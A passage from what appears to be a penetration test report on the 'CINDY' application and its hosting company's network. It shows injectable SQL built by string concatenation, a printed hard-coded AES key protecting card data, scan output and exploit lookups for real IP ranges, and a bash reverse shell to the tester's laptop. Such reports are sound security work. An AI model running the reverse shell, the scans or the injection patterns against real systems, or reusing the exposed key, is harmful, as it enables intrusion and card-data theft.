<a class="sourceLine" id="cb16-5" data-line-number="5">    <span class="bu">StringBuffer</span> numberStringBuffer = <span class="kw">new</span> <span class="bu">StringBuffer</span>();</a>
<a class="sourceLine" id="cb16-6" data-line-number="6">    <span class="kw">for</span> (<span class="bu">String</span> number : numbers)</a>
<a class="sourceLine" id="cb16-7" data-line-number="7">    {</a>
<a class="sourceLine" id="cb16-8" data-line-number="8">      <span class="kw">if</span> (numberStringBuffer.<span class="fu">length</span>() &gt; <span class="dv">0</span>) {</a>
<a class="sourceLine" id="cb16-9" data-line-number="9">        numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;,&quot;</span>);</a>
<a class="sourceLine" id="cb16-10" data-line-number="10">      }</a>
<a class="sourceLine" id="cb16-11" data-line-number="11">      numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;&#39;&quot;</span> + </a>
<a class="sourceLine" id="cb16-12" data-line-number="12">        StringUtil.<span class="fu">standardizeNumber</span>(number) + <span class="st">&quot;&#39;&quot;</span>);</a>
<a class="sourceLine" id="cb16-13" data-line-number="13">    }</a>
<a class="sourceLine" id="cb16-14" data-line-number="14">    <span class="bu">String</span> sql = <span class="st">&quot;select * from &quot;</span> + db + </a>
<a class="sourceLine" id="cb16-15" data-line-number="15">      <span class="st">&quot;.service_number where service_number in (&quot;</span> + </a>
<a class="sourceLine" id="cb16-16" data-line-number="16">      numberStringBuffer.<span class="fu">toString</span>() + <span class="st">&quot;)&quot;</span>;</a>
<a class="sourceLine" id="cb16-17" data-line-number="17">    <span class="bu">Statement</span> statement = connection.<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb16-18" data-line-number="18">    </a>
<a class="sourceLine" id="cb16-19" data-line-number="19">    <span class="bu">ResultSet</span> resultSet = statement.<span class="fu">executeQuery</span>(sql);</a>
<a class="sourceLine" id="cb16-20" data-line-number="20">    <span class="dt">boolean</span> result = <span class="kw">false</span>;</a>
<a class="sourceLine" id="cb16-21" data-line-number="21">    <span class="kw">if</span> (resultSet.<span class="fu">next</span>()) {</a>
<a class="sourceLine" id="cb16-22" data-line-number="22">      result = <span class="kw">true</span>;</a>
<a class="sourceLine" id="cb16-23" data-line-number="23">    }</a>
<a class="sourceLine" id="cb16-24" data-line-number="24">    <span class="fu">cleanup</span>(resultSet, <span class="kw">false</span>);</a>
<a class="sourceLine" id="cb16-25" data-line-number="25">    <span class="kw">return</span> result;</a>
<a class="sourceLine" id="cb16-26" data-line-number="26">  }</a></code></pre></div>
<ul>
<li>Method insertSERRecord in EventDAOImpl.class: the review did not identify whether the supplied serRecord can come from an untrusted source.</li>
</ul>
<div class="sourceCode" id="cb17"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb17-1" data-line-number="1">  <span class="kw">public</span> <span class="dt">void</span> <span class="fu">insertSERRecord</span>(TelstraSER serRecord)</a>
<a class="sourceLine" id="cb17-2" data-line-number="2">  {</a>
<a class="sourceLine" id="cb17-3" data-line-number="3">    <span class="bu">Statement</span> statement = <span class="kw">null</span>;</a>
<a class="sourceLine" id="cb17-4" data-line-number="4">    <span class="kw">try</span></a>
<a class="sourceLine" id="cb17-5" data-line-number="5">    {</a>
<a class="sourceLine" id="cb17-6" data-line-number="6">      statement = <span class="fu">getSession</span>().<span class="fu">connection</span>().<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb17-7" data-line-number="7">      <span class="bu">ResultSet</span> rs = statement</a>
<a class="sourceLine" id="cb17-8" data-line-number="8">        .<span class="fu">executeQuery</span>(<span class="st">&quot;select * from telstra_ser where service_number = &#39;&quot;</span> + </a>
<a class="sourceLine" id="cb17-9" data-line-number="9">        serRecord.<span class="fu">getServiceNumber</span>() + </a>
<a class="sourceLine" id="cb17-10" data-line-number="10">        <span class="st">&quot;&#39; and call_type = &#39;&quot;</span> + </a>
<a class="sourceLine" id="cb17-11" data-line-number="11">        serRecord.<span class="fu">getCallTypeCode</span>() + </a>
<a class="sourceLine" id="cb17-12" data-line-number="12">        <span class="st">&quot;&#39; and (date_off = &#39;null&#39; or date_off = &#39;&#39;) and quantity = &#39;&quot;</span> + </a>
<a class="sourceLine" id="cb17-13" data-line-number="13">        serRecord.<span class="fu">getQuantity</span>() + <span class="st">&quot;&#39; order by id&quot;</span>);</a></code></pre></div>
<ul>
<li>Method doesServiceNumbersExist in TestServiceNumberAlreadyExists.class: might be vulnerable.</li>
</ul>
<div class="sourceCode" id="cb18"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb18-1" data-line-number="1"><span class="kw">public</span> <span class="dt">boolean</span> <span class="fu">doesServiceNumbersExist</span>(<span class="bu">String</span> db, <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; numbers, <span class="bu">Connection</span> connection)</a>
<a class="sourceLine" id="cb18-2" data-line-number="2">    <span class="kw">throws</span> <span class="bu">Exception</span></a>
<a class="sourceLine" id="cb18-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb18-4" data-line-number="4">    <span class="bu">StringBuffer</span> numberStringBuffer = <span class="kw">new</span> <span class="bu">StringBuffer</span>();</a>
<a class="sourceLine" id="cb18-5" data-line-number="5">    <span class="kw">for</span> (<span class="bu">String</span> number : numbers)</a>
<a class="sourceLine" id="cb18-6" data-line-number="6">    {</a>
<a class="sourceLine" id="cb18-7" data-line-number="7">      <span class="kw">if</span> (numberStringBuffer.<span class="fu">length</span>() &gt; <span class="dv">0</span>) {</a>
<a class="sourceLine" id="cb18-8" data-line-number="8">        numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;,&quot;</span>);</a>
<a class="sourceLine" id="cb18-9" data-line-number="9">      }</a>
<a class="sourceLine" id="cb18-10" data-line-number="10">      numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;&#39;&quot;</span> + StringUtil.<span class="fu">standardizeNumber</span>(number) + <span class="st">&quot;&#39;&quot;</span>);</a>
<a class="sourceLine" id="cb18-11" data-line-number="11">    }</a>
<a class="sourceLine" id="cb18-12" data-line-number="12">    <span class="bu">String</span> sql = <span class="st">&quot;select * from &quot;</span> + db + <span class="st">&quot;.service_number where service_number in (&quot;</span> + numberStringBuffer.<span class="fu">toString</span>() + <span class="st">&quot;)&quot;</span>;</a>
<a class="sourceLine" id="cb18-13" data-line-number="13">    <span class="bu">System</span>.<span class="fu">out</span>.<span class="fu">println</span>(sql);</a>
<a class="sourceLine" id="cb18-14" data-line-number="14">    <span class="bu">Statement</span> statement = connection.<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb18-15" data-line-number="15">    </a>
<a class="sourceLine" id="cb18-16" data-line-number="16">    <span class="bu">ResultSet</span> resultSet = statement.<span class="fu">executeQuery</span>(sql);</a></code></pre></div>
<p>Overall there were a large number of SQL queries that did not make use of parameterised statements.</p>
<h4 id="encryption">Encryption</h4>
<p>A static hard-coded key for encryption of credit cards is in use.</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb19-1" data-line-number="1">  <span class="kw">private</span> <span class="dt">static</span> <span class="dt">byte</span>[] <span class="fu">encryptByteArray</span>(<span class="dt">byte</span>[] array)</a>
<a class="sourceLine" id="cb19-2" data-line-number="2">    <span class="kw">throws</span> <span class="bu">Exception</span></a>
<a class="sourceLine" id="cb19-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb19-4" data-line-number="4">    <span class="dt">byte</span>[] key = <span class="st">&quot;it176CB!7GLa3M0q&quot;</span>.<span class="fu">getBytes</span>();</a>
<a class="sourceLine" id="cb19-5" data-line-number="5">    <span class="bu">SecretKeySpec</span> desKey = <span class="kw">new</span> <span class="bu">SecretKeySpec</span>(key, <span class="st">&quot;AES&quot;</span>);</a>
<a class="sourceLine" id="cb19-6" data-line-number="6">    <span class="bu">Cipher</span> cipher = <span class="bu">Cipher</span>.<span class="fu">getInstance</span>(<span class="st">&quot;AES&quot;</span>);</a>
<a class="sourceLine" id="cb19-7" data-line-number="7">    cipher.<span class="fu">init</span>(<span class="dv">1</span>, desKey);</a>
<a class="sourceLine" id="cb19-8" data-line-number="8">    <span class="dt">byte</span>[] encryptedArray = cipher.<span class="fu">doFinal</span>(array);</a>
<a class="sourceLine" id="cb19-9" data-line-number="9">    <span class="kw">return</span> encryptedArray;</a>
<a class="sourceLine" id="cb19-10" data-line-number="10">  }</a></code></pre></div>
<p>The application appeared to store CVV numbers.</p>
<p>These issues are both automatic fails should the organisation be audited against the Payment Card Industry Data Security Standard.</p>
<p>No encryption of passwords was discovered.</p>
<h2 id="penetration-test-of-external-infrastructure">Penetration test of external infrastructure</h2>
<h3 id="scan-external-infrastructure">Scan external infrastructure</h3>
<p>Nmap and Nessus scans were run against the following hosts:</p>
<ul>
<li>103.55.76.16/29</li>
<li>103.74.184.248</li>
<li>103.55.76.9</li>
</ul>
<p>Scan configs and results have been included in the test_data tarball accompanying this report. A summary of results:</p>
<ul>
<li>mail server found at 103.55.76.16</li>
<li>CINDY production instances found at 103.74.184.248 and 103.55.76.23</li>
<li>VPN server (IPSEC and L2TP) found at 103.55.76.98</li>
<li>FTP servers found at:
<ul>
<li>103.55.76.16</li>
<li>103.55.76.17</li>
<li>103.55.76.18</li>
<li>103.55.76.19</li>
<li>103.55.76.20</li>
<li>103.55.76.21</li>
<li>103.55.76.22</li>
<li>103.55.76.23</li>
<li>103.55.76.98</li>
<li>103.55.76.248</li>
</ul></li>
</ul>
<h3 id="determine-hosting-locations">Determine hosting locations</h3>
<p>It was noted that routing information for 103.55.76.248 and the other addresses differed in the last few hops. In each case the last registered hop was either owned by anycast.com.au (103.30.216.147), or streamlinenetworksolutions.com.au (43.225.32.146). Both businesses are Melbourne based. This is consistent with BTB’s statement that CINDY is hosted in an active/active configuration in their datacentre and the Melbourne office.</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb20-1" data-line-number="1"><span class="ex">MacBook-Pro</span>:test_data gee$ traceroute 103.55.76.248</a>
<a class="sourceLine" id="cb20-2" data-line-number="2"><span class="ex">traceroute</span> to 103.55.76.248 (103.55.76.248), <span class="ex">64</span> hops max, 52 byte packets</a>
<a class="sourceLine" id="cb20-3" data-line-number="3"> <span class="ex">1</span>  192.168.1.1 (192.168.1.1)  <span class="ex">10.913</span> ms  1.231 ms  1.119 ms</a>
<a class="sourceLine" id="cb20-4" data-line-number="4"> <span class="ex">2</span>  192.168.2.1 (192.168.2.1)  <span class="ex">2.296</span> ms  1.749 ms  4.788 ms</a>
<a class="sourceLine" id="cb20-5" data-line-number="5"> <span class="ex">3</span>  lo0.bras1.cbr1.on.ii.net (150.101.32.170)  <span class="ex">16.176</span> ms  16.551 ms  15.733 ms</a>
<a class="sourceLine" id="cb20-6" data-line-number="6"> <span class="ex">4</span>  ae8.cr1.cbr1.on.ii.net (150.101.40.222)  <span class="ex">21.093</span> ms  16.430 ms  15.822 ms</a>
<a class="sourceLine" id="cb20-7" data-line-number="7"> <span class="ex">5</span>  ae1.cr1.mel8.on.ii.net (150.101.33.25)  <span class="ex">23.675</span> ms  23.168 ms  23.666 ms</a>
<a class="sourceLine" id="cb20-8" data-line-number="8"> <span class="ex">6</span>  as58511.vic.ix.asn.au (218.100.78.35)  <span class="ex">24.197</span> ms  26.740 ms  23.718 ms</a>
<a class="sourceLine" id="cb20-9" data-line-number="9"> <span class="ex">7</span>  vl8.cor1.m1.au.as58511.net (103.30.216.148)  <span class="ex">25.598</span> ms  25.002 ms  23.952 ms</a>
<a class="sourceLine" id="cb20-10" data-line-number="10"> <span class="ex">8</span>  lag11.bdr1.m1.au.as58511.net (103.30.216.147)  <span class="ex">24.336</span> ms  28.961 ms  23.339 ms</a>
<a class="sourceLine" id="cb20-11" data-line-number="11"> <span class="ex">9</span>  * * *</a>
<a class="sourceLine" id="cb20-12" data-line-number="12"></a>
<a class="sourceLine" id="cb20-13" data-line-number="13"><span class="ex">...snip...</span></a>
<a class="sourceLine" id="cb20-14" data-line-number="14"></a>
<a class="sourceLine" id="cb20-15" data-line-number="15"><span class="ex">MacBook-Pro</span>:test_data gee$ traceroute 103.55.76.23</a>
<a class="sourceLine" id="cb20-16" data-line-number="16"><span class="ex">traceroute</span> to 103.55.76.23 (103.55.76.23), <span class="ex">64</span> hops max, 52 byte packets</a>
<a class="sourceLine" id="cb20-17" data-line-number="17"> <span class="ex">1</span>  192.168.1.1 (192.168.1.1)  <span class="ex">1.577</span> ms  2.364 ms  2.530 ms</a>
<a class="sourceLine" id="cb20-18" data-line-number="18"> <span class="ex">2</span>  192.168.2.1 (192.168.2.1)  <span class="ex">1.912</span> ms  4.376 ms  12.130 ms</a>
<a class="sourceLine" id="cb20-19" data-line-number="19"> <span class="ex">3</span>  lo0.bras1.cbr1.on.ii.net (150.101.32.170)  <span class="ex">15.943</span> ms  17.563 ms  30.141 ms</a>
<a class="sourceLine" id="cb20-20" data-line-number="20"> <span class="ex">4</span>  ae8.cr1.cbr1.on.ii.net (150.101.40.222)  <span class="ex">15.957</span> ms  16.716 ms  15.776 ms</a>
<a class="sourceLine" id="cb20-21" data-line-number="21"> <span class="ex">5</span>  ae1.cr1.mel8.on.ii.net (150.101.33.25)  <span class="ex">24.523</span> ms  24.635 ms  23.541 ms</a>
<a class="sourceLine" id="cb20-22" data-line-number="22"> <span class="ex">6</span>  as58511.vic.ix.asn.au (218.100.78.35)  <span class="ex">23.441</span> ms  25.746 ms  23.591 ms</a>
<a class="sourceLine" id="cb20-23" data-line-number="23"> <span class="ex">7</span>  vl8.cor1.m1.au.as58511.net (103.30.216.148)  <span class="ex">40.867</span> ms  23.713 ms  25.842 ms</a>
<a class="sourceLine" id="cb20-24" data-line-number="24"> <span class="ex">8</span>  lag11.bdr1.m1.au.as58511.net (103.30.216.147)  <span class="ex">26.900</span> ms  33.725 ms  40.028 ms</a>
<a class="sourceLine" id="cb20-25" data-line-number="25"> <span class="ex">9</span>  7001038-4.as58511.net (43.225.32.146)  <span class="ex">25.025</span> ms  23.079 ms  23.504 ms</a>
<a class="sourceLine" id="cb20-26" data-line-number="26"><span class="ex">10</span>  * * *</a></code></pre></div>
<h3 id="fingerprint-ftp">Fingerprint FTP</h3>
<p>Fingerprinting each of the FTP services below failed with the remote server closing the connection without sending any data:</p>
<ul>
<li>103.55.76.16</li>
<li>103.55.76.17</li>
<li>103.55.76.18</li>
<li>103.55.76.19</li>
<li>103.55.76.20</li>
<li>103.55.76.21</li>
<li>103.55.76.22</li>
<li>103.55.76.23</li>
<li>103.55.76.98</li>
</ul>
<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb21-1" data-line-number="1"><span class="ex">MacBook-Pro</span>:test_data gee$ ftp 103.55.76.16</a>
<a class="sourceLine" id="cb21-2" data-line-number="2"><span class="ex">Connected</span> to 103.55.76.16.</a>
<a class="sourceLine" id="cb21-3" data-line-number="3"></a>
<a class="sourceLine" id="cb21-4" data-line-number="4"></a>
<a class="sourceLine" id="cb21-5" data-line-number="5"><span class="ex">421</span> Service not available, remote server has closed connection</a>
<a class="sourceLine" id="cb21-6" data-line-number="6"><span class="fu">ftp</span><span class="op">&gt;</span></a></code></pre></div>
<h3 id="check-encryption-strength-of-cindy-production-servers.">Check encryption strength of CINDY production servers.</h3>
<p>The CINDY servers at 103.74.184.248 and 103.55.76.23 were checked for encryption strength over HTTPS using Nessus and Qualys SSL Server Test. The scans identified several points of interest</p>
<ul>
<li>The services support 3DES, which has 112-bit key-space and is considered weak by today’s standards.</li>
<li>They are vulnerable to the SWEET32 attack, which requires capturing an active session with approximately 785GB of data.</li>
<li>The certificates were presented out of order. However, errors were not displayed when testing with Firefox, Chrome and Safari.</li>
</ul>
<p>None of these is considered to have a practical impact on security.</p>
<h3 id="test-vpn-server">Test VPN Server</h3>
<p>Ike-scan was used to test the IPSec settings.</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb22-1" data-line-number="1"><span class="ex">MacBook-Pro</span>:test_data gee$ sudo ike-scan -M --showbackoff 103.55.76.98 <span class="op">&gt;&gt;</span> ike.scan.103.55.76.98.log</a>
<a class="sourceLine" id="cb22-2" data-line-number="2"><span class="ex">Password</span>:</a>
<a class="sourceLine" id="cb22-3" data-line-number="3"><span class="ex">MacBook-Pro</span>:test_data gee$ cat ike.scan.103.55.76.98.log </a>
<a class="sourceLine" id="cb22-4" data-line-number="4"><span class="ex">Starting</span> ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)</a>
<a class="sourceLine" id="cb22-5" data-line-number="5"><span class="ex">103.55.76.98</span>    Main Mode Handshake returned</a>
<a class="sourceLine" id="cb22-6" data-line-number="6">    <span class="va">HDR=(</span>CKY-R<span class="va">=</span>0f01931726a98d1d<span class="va">)</span></a>
<a class="sourceLine" id="cb22-7" data-line-number="7">    <span class="va">SA=(</span>Enc<span class="va">=</span>3DES Hash<span class="va">=</span>SHA1 Auth<span class="va">=</span>PSK Group<span class="va">=</span>2:modp1024 LifeType<span class="va">=</span>Seconds LifeDuration(4<span class="va">)</span>=<span class="ex">0x00007080</span>)</a>
<a class="sourceLine" id="cb22-8" data-line-number="8">    <span class="va">VID=</span>afcad71368a1f1c96b8696fc77570100 <span class="kw">(</span><span class="ex">Dead</span> Peer Detection v1.0<span class="kw">)</span></a>
<a class="sourceLine" id="cb22-9" data-line-number="9"></a>
<a class="sourceLine" id="cb22-10" data-line-number="10"><span class="ex">IKE</span> Backoff Patterns:</a>
<a class="sourceLine" id="cb22-11" data-line-number="11"></a>
<a class="sourceLine" id="cb22-12" data-line-number="12"><span class="ex">IP</span> Address  No. Recv time       Delta Time</a>
<a class="sourceLine" id="cb22-13" data-line-number="13"><span class="ex">103.55.76.98</span>    1   1509322431.183015   0.000000</a>
<a class="sourceLine" id="cb22-14" data-line-number="14"><span class="ex">103.55.76.98</span>    2   1509322441.186165   10.003150</a>
<a class="sourceLine" id="cb22-15" data-line-number="15"><span class="ex">103.55.76.98</span>    3   1509322451.199489   10.013324</a>
<a class="sourceLine" id="cb22-16" data-line-number="16"><span class="ex">103.55.76.98</span>    4   1509322461.211525   10.012036</a>
<a class="sourceLine" id="cb22-17" data-line-number="17"><span class="ex">103.55.76.98</span>    5   1509322471.225030   10.013505</a>
<a class="sourceLine" id="cb22-18" data-line-number="18"><span class="ex">103.55.76.98</span>    6   1509322481.237275   10.012245</a>
<a class="sourceLine" id="cb22-19" data-line-number="19"><span class="ex">103.55.76.98</span>    Implementation guess: Cisco IOS 12.1, 12.2 or 12.3 / Watchguard Firebox / Gnat Box</a>
<a class="sourceLine" id="cb22-20" data-line-number="20"></a>
<a class="sourceLine" id="cb22-21" data-line-number="21"><span class="ex">Ending</span> ike-scan 1.9: 1 hosts scanned in 110.178 seconds (0.01 hosts/sec)<span class="bu">.</span>  <span class="ex">1</span> returned handshake<span class="kw">;</span> <span class="ex">0</span> returned notify</a></code></pre></div>
<p>Aggressive mode was not supported:</p>
<pre><code>MacBook-Pro:test_data gee$ sudo ike-scan --pskcrack --aggressive --id=peer 103.55.76.98 &gt;&gt; ike.scan.103.55.76.98.log
MacBook-Pro:test_data gee$ tail -n 3 ike.scan.103.55.76.98.log 
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)

Ending ike-scan 1.9: 1 hosts scanned in 2.447 seconds (0.41 hosts/sec).  0 returned handshake; 0 returned notify</code></pre>
<p>Running the Nessus L2TP detection script did not allow for further fingerprinting of the service.</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb24-1" data-line-number="1"><span class="ex">MacBook-Pro</span>:plugins gee$ /Library/Nessus/run/bin/nasl -t 103.55.76.98 l2tp_detection.nasl</a>
<a class="sourceLine" id="cb24-2" data-line-number="2"><span class="ex">l2tp_detection.nasl</span>: Success</a></code></pre></div>
<figure>
<img src="images/l2tp-detection.png" title="L2TP detection using nessus" alt="l2tp-detection.png" /><figcaption>l2tp-detection.png</figcaption>
</figure>
<h3 id="review-exploits-against-cisco-vpn">Review exploits against CISCO VPN</h3>
<p>A check on exploitdb reveals the following exploits that could be applicable:</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb25-1" data-line-number="1"><span class="ex">MacBook-Pro</span>:vpn_exploits gee$ searchsploit cisco <span class="kw">|</span> <span class="fu">grep</span> -i ios <span class="kw">|</span> <span class="fu">grep</span> 12 <span class="kw">|</span> <span class="fu">grep</span> remote</a>
<a class="sourceLine" id="cb25-2" data-line-number="2"><span class="ex">Cisco</span> Catalyst 2960 IOS 12.2(55)<span class="ex">SE1</span> - <span class="st">&#39;ROCEM&#39;</span> Remote Code Execution                <span class="kw">|</span> <span class="ex">hardware/remote/42122.py</span></a>
<a class="sourceLine" id="cb25-3" data-line-number="3"><span class="ex">Cisco</span> Catalyst 2960 IOS 12.2(55)<span class="ex">SE11</span> - <span class="st">&#39;ROCEM&#39;</span> Remote Code Execution               <span class="kw">|</span> <span class="ex">hardware/remote/41872.py</span></a>
<a class="sourceLine" id="cb25-4" data-line-number="4"><span class="ex">Cisco</span> IOS 11.x/12.0 - ILMI SNMP Community String                                   <span class="kw">|</span> <span class="ex">hardware/remote/20652.txt</span></a>
<a class="sourceLine" id="cb25-5" data-line-number="5"><span class="ex">Cisco</span> IOS 11.x/12.x - HTTP %% Exploit                                              <span class="kw">|</span> <span class="ex">hardware/remote/19882.pl</span></a>
<a class="sourceLine" id="cb25-6" data-line-number="6"><span class="ex">Cisco</span> IOS 11.x/12.x - HTTP Configuration Arbitrary Administrative Access (1)       <span class="kw">|</span> <span class="ex">hardware/remote/20975.pl</span></a>
<a class="sourceLine" id="cb25-7" data-line-number="7"><span class="ex">Cisco</span> IOS 11.x/12.x - HTTP Configuration Arbitrary Administrative Access (2)       <span class="kw">|</span> <span class="ex">hardware/remote/20976.c</span></a>
<a class="sourceLine" id="cb25-8" data-line-number="8"><span class="ex">Cisco</span> IOS 11.x/12.x - HTTP Configuration Arbitrary Administrative Access (3)       <span class="kw">|</span> <span class="ex">hardware/remote/20977.pl</span></a>
<a class="sourceLine" id="cb25-9" data-line-number="9"><span class="ex">Cisco</span> IOS 11.x/12.x - HTTP Configuration Arbitrary Administrative Access (4)       <span class="kw">|</span> <span class="ex">hardware/remote/20978.pl</span></a>
<a class="sourceLine" id="cb25-10" data-line-number="10"><span class="ex">Cisco</span> IOS 11/12 - OSPF Neighbor Buffer Overflow                                    <span class="kw">|</span> <span class="ex">hardware/remote/22271.c</span></a>
<a class="sourceLine" id="cb25-11" data-line-number="11"><span class="ex">Cisco</span> IOS 12.0.2 - Syslog Crash                                                    <span class="kw">|</span> <span class="ex">hardware/remote/19531.txt</span></a>
<a class="sourceLine" id="cb25-12" data-line-number="12"><span class="ex">Cisco</span> IOS 12.3 - <span class="st">&#39;LPD&#39;</span> Remote Buffer Overflow                                      <span class="kw">|</span> <span class="ex">hardware/remote/30652.txt</span></a>
<a class="sourceLine" id="cb25-13" data-line-number="13"><span class="ex">Cisco</span> IOS 12.3(18) <span class="ex">-</span> FTP Server Remote Exploit (Attached to GDB)                   <span class="kw">|</span> <span class="ex">hardware/remote/6155.c</span></a>
<a class="sourceLine" id="cb25-14" data-line-number="14"><span class="ex">Cisco</span> IOS 12.4(23) <span class="ex">-</span> HTTP Server Multiple Cross-Site Scripting Vulnerabilities     <span class="kw">|</span> <span class="ex">hardware/remote/32776.txt</span></a>
<a class="sourceLine" id="cb25-15" data-line-number="15"><span class="ex">Cisco</span> IOS 12.x - HTTP Server Multiple Cross-Site Scripting Vulnerabilities         <span class="kw">|</span> <span class="ex">hardware/remote/32723.txt</span></a>
<a class="sourceLine" id="cb25-16" data-line-number="16"><span class="ex">Cisco</span> IOS 12.x/11.x - HTTP Remote Integer Overflow                                 <span class="kw">|</span> <span class="ex">hardware/remote/77.c</span></a></code></pre></div>
<p>The tester checked each in turn for applicability:</p>
<ul>
<li>hardware/remote/42122.py: N/A - requires telnet</li>
<li>hardware/remote/41872.py: N/A - requires telnet</li>
<li>hardware/remote/20652.txt: N/A - requires SNMP</li>
<li>hardware/remote/19882.pl: N/A - requires Telnet, SSH or HTTP Admin Interface</li>
<li>hardware/remote/20975.pl: N/A - requires HTTP</li>
<li>hardware/remote/20976.c: N/A - requires HTTP</li>
<li>hardware/remote/20977.pl: N/A - requires HTTP</li>
<li>hardware/remote/20978.pl: N/A - requires HTTP</li>
<li>hardware/remote/22271.c: not performed as exploit may cause a denial of service and requires testing in a lab environment which was not available</li>
<li>hardware/remote/19531.txt: N/A - requires syslog</li>
<li>hardware/remote/30652.txt: N/A - requires access to LPD and the ability to set the hostname</li>
<li>hardware/remote/6155.c: N/A - exploit requires customisation and testing in a lab environment</li>
<li>hardware/remote/32776.txt: N/A - requires HTTP</li>
<li>hardware/remote/32723.txt: N/A - requires HTTP</li>
<li>hardware/remote/77.c: N/A - requires HTTP</li>
</ul>
<h2 id="penetration-test-of-internal-network">Penetration test of internal network</h2>
<p>Having demonstrated code execution in the CINDY application and that one CINDY instance was hosted in the Melbourne office, the tester performed an internal network penetration test connecting to the network via a VPN supplied by BTB.</p>
<h3 id="initial-recon">Initial recon</h3>
<p>A DNS server was set as part of the connection at 10.3.1.21, the testers laptop was assigned an IP of 10.3.72.248.</p>
<h3 id="perform-scan-against-10.3.1.024">Perform scan against 10.3.1.0/24</h3>
<p>The tester guessed that the domain controller was hosted on a 24 bit subnet, and performed a corresponding ping sweep followed by a network scan of active hosts. Several servers were discovered (full scan results have been included in the test data accompanying this report):</p>
<ul>
<li>10.3.1.21 - Domain controller</li>
<li>10.3.1.22 - b2b-web1
<ul>
<li>Web service includes comments that point to directory I3Root.</li>
<li>Load page and it looks like some sort of chat client.</li>
<li>Title is “Interaction Web Tools”</li>
<li>connect to RDP, login screen is for win2012r2</li>
</ul></li>
<li>10.3.1.23 - Ubiquity networks WiFi controller
<ul>
<li>Web service on 8080 redirects to 8443, UniFi device</li>
<li>default creds (root/ubnt, ubnt/ubnt) don’t work</li>
<li>reports version 5.4.18 in login page</li>
<li>Runs OpenSSH 6.6.1</li>
<li>Apache Tomcat/Coyote JSP engine 1.1</li>
</ul></li>
<li>10.3.1.24 - CINDY application server
<ul>
<li>A request for https://10.3.1.24/cortel-admin/ showed the CINDY login page</li>
<li>Request to webpage on 8080 self identifies as rancher
<ul>
<li>Comments in source say version is 1.5.9</li>
<li>Default creds of rancher/ and rancher/rancher don’t work</li>
<li>Server header is Jetty(9.2.11.v20150529)</li>
</ul></li>
<li>9091 returns a blank page</li>
</ul></li>
<li>10.3.1.28 - Database server
<ul>
<li>FileZilla Server 0.9.59 beta on port 21</li>
<li>MySQL 5.6.31-log on 3306</li>
<li>The server exposes SMB services which reports as Windows 98, but the result could not be verified</li>
</ul></li>
<li>10.3.1.200
<ul>
<li>All ports filtered/closed except 22</li>
<li>OpenSSH 6.6.1 on 22</li>
<li>No further information available</li>
</ul></li>
</ul>
<h3 id="perform-broader-network-sweeps">Perform broader network sweeps</h3>
<p>The tester performed broader ping sweeps the follow networks in the search for more hosts:</p>
<ul>
<li>10.1.0.0/16</li>
<li>10.2.0.0/16</li>
<li>10.3.0.0/16</li>
<li>10.4.0.0/16</li>
<li>10.5.0.0/16</li>
</ul>
<p>After active hosts were identified, network scans were run aginst them to fingerprint services and a general purpose label attached to the subnet:</p>
<ul>
<li>10.3.0.0/16:
<ul>
<li>10.3.1.0/24 looks like servers related to office support: domain controller, wireless, etc.</li>
<li>10.3.11.0/24 looks like more office services
<ul>
<li>10.3.11.1 looks like a huawei switch</li>
<li>NAS at 10.3.11.5</li>
<li>rasberry PI at 10.3.11.11-18. They expose the same services and have the same SSH keys.</li>
</ul></li>
<li>10.3.64.1 looks like a huawei switch</li>
<li>10.3.65.0/24 looks like workstations</li>
<li>10.3.66.0/24 looks like phones</li>
<li>10.3.71.1 looks like a huawei switch</li>
<li>10.3.72.0/24 looks like a VPN network
<ul>
<li>10.3.72.248 was the testers own laptop</li>
<li>10.3.72.250 - Win7 SP1 MANAGEMENTPC.connectivityit.com.au: the client confirmed this server was out of scope.</li>
</ul></li>
<li>10.3.200.0/24 looks like core networking kit
<ul>
<li>palo alto firewall on 10.3.200.200</li>
<li>mikrotik on 10.3.300.253</li>
</ul></li>
<li>10.3.255.1/24 looks like network perimeter
<ul>
<li>found mikrotik and windows IIS server named MEL049GWP025</li>
</ul></li>
</ul></li>
<li>10.2.0.0/16: Several hosts were discovered at 10.2.200.0/24 and 10.2.255.1, but further fingerprinting was not performed.</li>
<li>Other subnets did not return any active hosts.</li>
</ul>
<h3 id="test-raspberry-pi-devices">Test Raspberry PI devices</h3>
<p>The scans across 10.3.11.0/24 indicated no auth on VNC services for a number of hosts. The tester connected to each server using VNC-Viewer and were presented with a browser running in full-screen mode.</p>
<figure>
<img src="images/salesforce_access.png" title="Browser running fullscreen inside VNC session" alt="salesforce_access.png" /><figcaption>salesforce_access.png</figcaption>
</figure>
<p>He exited full screen mode, opened a new terminal window, elevated privileges with sudo, and setup a reverse shell with the command:</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb26-1" data-line-number="1"><span class="fu">bash</span> -i <span class="op">&amp;&gt;</span> /dev/tcp/10.3.72.248/8081 <span class="op">0&gt;&amp;1</span></a></code></pre></div>
